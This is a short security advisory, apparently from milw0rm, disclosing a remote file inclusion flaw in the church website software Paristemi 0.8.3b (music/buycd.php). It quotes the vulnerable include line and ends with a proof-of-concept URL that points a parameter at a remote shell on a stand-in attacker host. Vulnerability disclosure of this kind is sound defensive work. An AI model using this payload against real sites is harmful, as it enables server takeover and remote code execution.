@@ -1,0 +1,25 @@
++-------------------------------------------------------------------------------------------
++ Paristemi 0.8.3b (buycd.php) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Vendor ............: http://www.paristemi.com/
++ Affected Software .: Paristemi 0.8.3b
++ Download ..........: http://downloads.sourceforge.net/paristemi/paristemi-0_8_3.zip
++ Description .......: "Paristemi is a PHP/MySQL free website for churches"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ Paristemi music/buycd.php fails to initialize the $HTTP_DOCUMENT_ROOT variable before using
++ it to include files, assuming register_globals = on, we can initialize the variable in a
++ query string and include a remote file of our choice.
++
++ Vulnerable Code:
++ music/buycd.php, line(s) 03:
++ -> <?php require_once $HTTP_DOCUMENT_ROOT.$INCLUDE_PATH.$HEADER.
++ 
++ Proof Of Concept:
++ http://[target]/[path]/music/buycd.php?HTTP_DOCUMENT_ROOT=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-19]
